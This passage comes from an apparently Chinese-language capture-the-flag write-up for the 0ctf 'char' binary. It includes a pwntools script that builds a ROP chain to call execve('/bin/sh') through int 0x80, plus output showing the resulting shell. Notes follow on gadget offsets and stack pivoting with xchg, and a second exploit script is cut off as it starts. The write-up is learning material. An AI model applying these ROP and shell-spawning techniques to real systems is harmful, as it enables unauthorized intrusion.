style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+="B"*0x4c&nbsp;#&nbsp;&nbsp;&#60;--add&nbsp;esp,&nbsp;0x4c</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(0x41414141)*4</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(xor_edx_edx+base)&nbsp;#xor&nbsp;edx,&nbsp;edx&nbsp;;&nbsp;pop&nbsp;ebx&nbsp;;&nbsp;mov&nbsp;eax,&nbsp;edx&nbsp;;&nbsp;pop&nbsp;esi&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;pop&nbsp;ebp&nbsp;;&nbsp;ret&nbsp;--&#62;eax=0&nbsp;edx=0</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(0x41414141)*4</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#ebx--&#62;/bin/sh&nbsp;0x556bb7ec</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#0x556bb7ec=0x556b477c+0x7070</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(pop_ebx+base)#&nbsp;xor&nbsp;eax,&nbsp;eax&nbsp;;&nbsp;pop&nbsp;ebx&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(0x556b477c)</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(inc_eax+base)*0x70&nbsp;#*0x70&nbsp;#&nbsp;inc&nbsp;eax&nbsp;;&nbsp;ret&nbsp;0</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(add_ah_al+base)&nbsp;#add&nbsp;ah,&nbsp;al&nbsp;;&nbsp;ret&nbsp;</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(add_bh_ah+base)&nbsp;#add&nbsp;ah,&nbsp;al&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(add_bl_al+base)&nbsp;#add&nbsp;bl,&nbsp;al&nbsp;;&nbsp;xor&nbsp;eax,&nbsp;eax&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#eax=0xb&nbsp;</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(xor_eax_eax_2+base)#&nbsp;xor&nbsp;eax,&nbsp;eax&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;ret&nbsp;&nbsp;&nbsp;--&#62;eax=0</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(inc_eax+base)*0xc&nbsp;#*eax=0xb&nbsp;#&nbsp;inc&nbsp;eax&nbsp;;&nbsp;ret&nbsp;0</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(int_80+base)&nbsp;#&nbsp;int&nbsp;0x80</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><img width="167"  height="157"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char3893.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >EAX=0xb</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >EBX-&#62;/bin/sh</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >ECX=EDX=0</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >成功</font>CALL&nbsp;EXECVE打开一个shell</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="290"  height="38"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char3949.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >$&nbsp;uname&nbsp;-a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >Linux&nbsp;migraine&nbsp;4.13.0-41-generic&nbsp;#46~16.04.1-Ubuntu&nbsp;SMP&nbsp;Thu&nbsp;May&nbsp;3&nbsp;10:06:43&nbsp;UTC&nbsp;2018&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >一些笔记：</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >1.ret&nbsp;x&nbsp;即在EIP跳转之后esp&nbsp;=&nbsp;esp+4+x</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >2.计算gadget的确切地址</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >例如我们</font>writeup中找到的gadget</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0x00174a4f&nbsp;:&nbsp;add&nbsp;eax,&nbsp;dword&nbsp;ptr&nbsp;[ebx]&nbsp;;&nbsp;pop&nbsp;ecx&nbsp;;&nbsp;add&nbsp;al,&nbsp;0xa&nbsp;;&nbsp;ret&nbsp;我们只需要pop&nbsp;ecx之后的gadget，如何计算从pop&nbsp;ecx开始的确切地址呢。Gdb调试是一个方案，但是这道题情况特殊，只能计算。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >在</font>pwntools中，使用asm将前面的指令转化为16进制码，就能计算出长度。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >&#62;&#62;&#62;&nbsp;asm('add&nbsp;eax,&nbsp;dword&nbsp;ptr&nbsp;[ebx]')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >'\x03\x03'&nbsp;#占用2个字节</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >所以</font>pop_ecx=0x00174a4f+0x2&nbsp;#加上base地址正好能够过审</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#可以通过&nbsp;ROPgadget&nbsp;--binary&nbsp;libc.so&nbsp;&#62;gadget将gadget输入文件，方便查找（cat&nbsp;gadget&nbsp;|grep&nbsp;**）</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="mso-list:l0 level1 lfo1;" ><![if !supportLists]><span style="font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >终于补上了自己的知识盲区</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=justify  style="mso-pagination:none;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >ROP实现&nbsp;int&nbsp;0x80呼叫中断，和shellcode的原理相同。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0x02&nbsp;拓展思路</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >扩展思路：栈控制</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >观察栈，</font>0xff87b4f4栈地址（高亮）存放的是src数组。#也就是主函数中的s数组。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >地址</font>0xff87b45c的地址存放的是dest数组。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >两者虽然理论上是相同的，但是因为进入内存使用的函数不同，也会导致差异。</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >Dest数组会受到strcpy的截断(\x00)，但是src因为是scanf（通过回车或者空格截断）输入，所以不会被\x00截断。所以src数组一般来说才是完整的，而dest数组非常容易被截断。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >我们知道</font>dest数组才是造成栈溢出的原因，使用strcpy函数导致ROP链接非常容易被截断。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是通过查看大佬的博客，通过够控制</font>esp，指向src内的ROP链。这样gadget就没有限制了。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >然后就可以自由选择</font>ROP了</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="417"  height="156"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char4899.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><img width="246"  height="88"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char4901.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >根据调试过程中发现，</font>ecx寄存器总是指向src数组偏移28位的地址。所以可以通过ecx给esp赋值，让程序跳转到src的ROP链上。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >寻找</font>Gadget</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >$&nbsp;ROPgadget&nbsp;--binary&nbsp;libc.so&nbsp;|grep&nbsp;"xchg&nbsp;eax,&nbsp;esp"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >Xchg是一个关键的指令，可以交换eax和esp的值，就可以直接控制栈顶的位置。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >下面是</font>exp脚本</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >from&nbsp;pwn&nbsp;import&nbsp;*</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >p=process('./char')</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >gdb.attach(p,'b&nbsp;*0x08048692')</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >context.log_level='Debug'</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >libc=ELF('libc.so')</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >elf=ELF('char')</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >base=0x5555e000</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p 